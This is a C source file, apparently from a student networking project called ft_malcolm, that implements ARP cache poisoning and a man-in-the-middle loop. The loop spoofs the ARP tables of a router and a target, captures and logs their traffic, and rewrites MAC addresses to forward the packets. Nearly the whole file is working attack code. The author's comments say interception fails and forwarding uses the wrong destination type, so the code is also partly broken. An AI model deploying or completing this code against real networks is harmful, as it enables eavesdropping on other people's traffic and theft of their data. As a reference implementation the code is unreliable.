
#include <ft_malcolm.h>
#include <arp.h>
#include <ftlibc.h>

# include <netinet/if_ether.h>
# include <signal.h>
# include <sys/time.h>
# include <sys/socket.h>
# include <arpa/inet.h>
# include <linux/if_packet.h>
# include <errno.h>

///BUG: Cannot intercept comunication for some reason
///HINTS: Can poison both targets but i've receive nothing from a ping between targets
///HINTS: After the ping the arp table is reset (containing good values)
///MAYBE: My computer receives the ping, aswers with a pong and ARP is updated.

///TODO: Recv arp replies (i ve commented this for the moment)

# define PRINT_INFO(x...) (dprintf(1, x))

# define SADDRVALUETO_SADDRIN(x) (*(struct sockaddr_in *)&(x))

static err_t handle_incoming_arp(uint16_t protocol, in_addr_t addr, proginfo_t *const info)
{
    err_t st = SUCCESS;

    if (ntohs(protocol) == ARP_REQUEST)
    {
        if (addr == SADDRVALUETO_SADDRIN(info->router).sin_addr.s_addr)
            st = spoof_router(info);
        else
            st = spoof_target(info);
    }
    else if (ntohs(protocol) == ARP_REPLY)
    {
        if (SADDRVALUETO_SADDRIN(info->router).sin_addr.s_addr)
            st = spoof_target(info);
        else
            st = spoof_router(info);
    }
    return st;
}

static err_t look_for_arp_packets(proginfo_t *info)
{
    err_t st = SUCCESS;
    static uint8_t buff[0X1000];
    struct ethhdr *const eth = (struct ethhdr *)buff;
    struct sockaddr src;

    const ssize_t recvbytes = recvfrom(info->sockarp, buff, sizeof(buff) / sizeof(*buff), 0, &src, (socklen_t[]){sizeof(src)});

    if (recvbytes < 0)
    {
        if (errno == EAGAIN)
            goto error;
        PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
        st = INVSYSCALL;
        goto error;
    }
    else if (recvbytes == 0)
        goto error;

    if (eth->h_proto == ETH_P_ARP)
        st = handle_incoming_arp(((struct ether_arp *)(buff + sizeof(*eth)))->arp_op, SADDRVALUETO_SADDRIN(src).sin_addr.s_addr, info);

error:
    return st;
}

static err_t forward_packet(int sockfd, uint8_t *const packet, ssize_t packetlen, const struct sockaddr_ll *dest)
{
    err_t st = SUCCESS;

    const ssize_t sentbytes = sendto(sockfd, packet, packetlen, 0, (struct sockaddr*)dest, sizeof(*dest));

    if (sentbytes < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "sendto");
        st = INVSYSCALL;
    }
    else if (sentbytes != packetlen)
    {
        PRINT_ERROR(__progname "%s\n", ": error: forwarded packet is corrupted. Unpoison and exit.");
        st = INVPACKETLEN;
    }
    return st;
}

err_t man_in_the_middle(const char *av[], const proginfo_t *const info, volatile sig_atomic_t *unpoinson)
{
    err_t st = SUCCESS;
    struct sockaddr_ll sll;
    ssize_t recvbytes = 0;
    static uint8_t buff[0X10000];
    struct ethhdr *const eth = (struct ethhdr *)buff;
    bool isstdout = false;

    /* Parse router's IP and MAC address, also stdout option */
    PRINT_INFO(__progname ": %s\n", "Launching man in the middle functionality.");
    if ((st = parse_optional_args(av, (proginfo_t*)info, &isstdout)) != SUCCESS)
        goto error;

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    PRINT_INFO("Spoofing srcs's MAC address (`%s\') into target %s\'s ARP table ...\n", info->mymachine.mac, info->router.ip);
    if ((send_request_before_spoof_router(info)) != SUCCESS
    || (st = spoof_router(info)) != SUCCESS)
        goto error;
    PRINT_INFO("%s\n", "Done");

    /* Try to always unpoison target & router if the program is interrupted */
    *unpoinson = true;

    /* Spoof my MAC address into router's ARP table at target's ip index*/
    PRINT_INFO("Spoofing srcs's MAC address (`%s\') into target %s\'s ARP table ...\n", info->mymachine.mac, info->target.ip);
    if ((st = send_request_before_spoof_target(info)) != SUCCESS
    || (st = spoof_target(info)) != SUCCESS)
        goto error;
    PRINT_INFO("%s\n", "Done");

    struct timeval tv = (struct timeval){
        .tv_sec = 0,
        .tv_usec = 10};

    /* Make ARP socket non blocking for intercept incoming ARP packets */
    if (setsockopt(info->sockarp, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
    {
        PRINT_ERROR(MSG_ERROR_SYSCALL, "setsockopt");
        st = INVSYSCALL;
        goto error;
    }

    PRINT_INFO("Intercepting and loggin target's (`%s\' <-> `%s\') comunication, press ctrl^C to end.\n", info->target.ip, info->router.ip);

    for ( ; ; )
    {
        printf("[DEBUG] Waiting for incoming packets\n");

        if ((recvbytes = recvfrom(info->sockip, buff, sizeof(buff) / sizeof(*buff), 0, (struct sockaddr*)&sll, (socklen_t[]){sizeof(sll)})) < 0)
        {
            PRINT_ERROR(MSG_ERROR_SYSCALL, "recvfrom");
            st = INVSYSCALL;
            goto error;
        }

        printf("[DEBUG] Packet intercepted\n");

        /* Supports only IPv4 for the moment */
        if (SADDRVALUETO_SADDRIN(sll).sin_family != AF_INET)
            continue;

        ///TODO: Last thing to do
        /* Intercept and spoof any attempt of ARP */
        // if ((st = look_for_arp_packets((proginfo_t*)info)) != SUCCESS)
        //     goto error;

        /* (filter) Log/forward only packet from target or router */
        if (SADDRVALUETO_SADDRIN(sll).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->router.addr).sin_addr.s_addr)
        {
            /* Log packet's matadada and payload */
            log_content(buff, recvbytes, isstdout);
            /* Overwritte the src's MAC address with mine */
            ft_memcpy(sll.sll_addr, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
            ft_memcpy(eth->h_source, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
            /* Sent packet to its destination (in victim's point of view) */

            ///TODO: Bad destination type for forward packet
            if ((st = forward_packet(info->sockip, buff, recvbytes, (const struct sockaddr *)&info->target.addr)) != SUCCESS)
                goto error;
        }
        else if (SADDRVALUETO_SADDRIN(sll).sin_addr.s_addr == SADDRVALUETO_SADDRIN(info->target.addr).sin_addr.s_addr)
        {
            log_content(buff, recvbytes, isstdout);
            ft_memcpy(sll.sll_addr, getmacfromstr(info->mymachine.mac), SIZEOFMAC);
            ft_memcpy(eth->h_source, getmacfromstr(info->mymachine.mac), SIZEOFMAC);

            ///TODO: Bad destination type for forward packet
            if ((st = forward_packet(info->sockip, buff, recvbytes, (const struct sockaddr *)&info->router.addr)) != SUCCESS)
                goto error;
        }

        ft_memset(buff, 0, recvbytes);
    }

error:
    return st;
}
